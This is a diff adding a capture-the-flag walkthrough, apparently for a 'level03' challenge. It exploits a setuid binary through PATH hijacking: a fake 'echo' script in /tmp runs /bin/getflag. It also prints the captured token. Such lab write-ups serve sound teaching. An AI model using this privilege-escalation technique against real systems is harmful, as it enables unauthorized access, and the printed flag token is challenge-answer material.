@@ -1,0 +1,42 @@
+
+-> ls -la
+
+there is an interesting file :
+
+-rwsr-sr-x 1 flag03 level03 ... level03
+
+this means that the file is executable by the user level03 so..
+
+-> ./level03
+
+Exploit me
+
+-> strings level03 | grep "Exploit me"
+
+/usr/bin/env echo Exploit me
+
+-> cd /tmp/
+
+-> echo '/bin/getflag' > echo
+
+-> chmod 777 echo
+
+-> ls -l
+
+-rwxrwxrwx 1 level03 level03 ... echo
+
+then I went back to home in orther to add /tmp to the env var $PATH
+
+-> export PATH=/tmp:$PATH
+
+-> printenv | grep "PATH"
+
+PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+Then I executed level03 again
+
+-> ./level03
+
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+-> su level04 ..
